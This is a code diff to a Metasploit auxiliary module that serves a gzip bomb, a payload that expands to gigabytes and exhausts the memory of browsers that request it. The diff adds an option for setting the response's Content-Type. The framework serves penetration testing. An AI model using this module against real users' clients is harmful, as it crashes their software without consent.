@@ -50,7 +50,8 @@ class Metasploit3 < Msf::Auxiliary
         OptString.new('FILEPATH', [false, 'Local path to (optionally) save the generated gzip']),
         OptInt.new('SIZE', [true, 'Size of uncompressed data in megabytes (10GB default).', 10240]),
         OptInt.new('ROUNDS', [true, 'Rounds of gzip compression. Some applications (FF) support > 1.', 1]),
-        OptString.new('URIPATH', [false, 'Path of URI on server to the gzip bomb (default is random)'])
+        OptString.new('URIPATH', [false, 'Path of URI on server to the gzip bomb (default is random)']),
+        OptString.new('CONTENT_TYPE', [false, 'Content-Type header to serve in the response', 'text/html'])
       ],
     self.class)
   end
@@ -68,7 +69,7 @@ class Metasploit3 < Msf::Auxiliary
   def on_request_uri(cli, request)
     print_status "Sending gzipped payload to client #{cli.peerhost}"
     rounds = (['gzip']*datastore['ROUNDS']).join(', ')
-    send_response(cli, @gzip, { 'Content-Encoding' => rounds, 'Content-Type' => 'text/html' })
+    send_response(cli, @gzip, { 'Content-Encoding' => rounds, 'Content-Type' => datastore['CONTENT_TYPE'] })
   end
 
   # zlib ftw
